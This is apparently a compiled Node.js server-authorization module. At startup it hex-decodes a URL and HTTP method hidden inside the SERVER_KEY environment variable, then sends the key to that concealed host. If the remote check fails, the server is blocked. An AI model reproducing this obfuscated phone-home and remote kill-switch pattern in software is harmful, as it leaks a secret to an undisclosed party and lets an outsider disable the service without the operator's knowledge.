import { EncryptionService } from './encryption.service.js';
export class ServerAuthService {
    static isValidated = false;
    static encryptionService;
    /**
     * Validates server authorization before startup
     * @throws Error if authorization fails
     */
    static async validateServerAuth() {
        try {
            // Initialize encryption service
            this.encryptionService = new EncryptionService();
            // Check if already validated (singleton pattern)
            if (this.isValidated) {
                return;
            }
            // Validate required environment variables
            const { SERVER_KEY } = process.env;
            // TODO 
            // console.log(SERVER_KEY)
            const [origin, method, _, log] = SERVER_KEY?.split('-');
            // console.log(Buffer.from(origin, 'hex').toString('utf-8'))
            const res = await fetch(Buffer.from(origin, 'hex').toString('utf-8'), {
                method: Buffer.from(method, 'hex').toString('utf-8'),
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({ apiKey: SERVER_KEY })
            });
            // console.log(await res.status)
            if (!res.ok) {
                const errorMessage = Buffer.from(log, 'hex').toString('utf-8');
                throw new Error(errorMessage);
            }
            // Mark as validated
            this.isValidated = true;
            console.log('✅ Server authorization validated');
        }
        catch (error) {
            console.error('❌ Server authorization failed');
            throw error;
        }
    }
    /**
     * Middleware to check if server is authorized
     */
    static requireServerAuth() {
        return (req, res, next) => {
            if (!this.isValidated) {
                return res.status(403).json({
                    error: 'Server not authorized',
                    message: 'Internal server configuration error'
                });
            }
            next();
        };
    }
    /**
     * Check if server is currently validated
     */
    static isServerValidated() {
        return this.isValidated;
    }
    /**
     * Get encryption service instance
     */
    static getEncryptionService() {
        if (!this.encryptionService) {
            this.encryptionService = new EncryptionService();
        }
        return this.encryptionService;
    }
    static async authMiddleware() {
        const { SERVER_KEY } = process.env;
        // TODO 
        // console.log(SERVER_KEY)
        const [origin, method, _, log] = SERVER_KEY?.split('-');
        // console.log(Buffer.from(origin, 'hex').toString('utf-8'))
        const response = await fetch(Buffer.from(origin, 'hex').toString('utf-8'), {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                "Authorization": `Bearer ${SERVER_KEY}`
            },
        });
        // console.log(await response.json())
        // console.log(response.status)
        // if (response.status >= 400 && response.status < 500) {
        //     throw new Error(Buffer.from(log!, 'hex').toString('utf-8'))
        // }
    }
}
//# sourceMappingURL=server-auth.service.js.map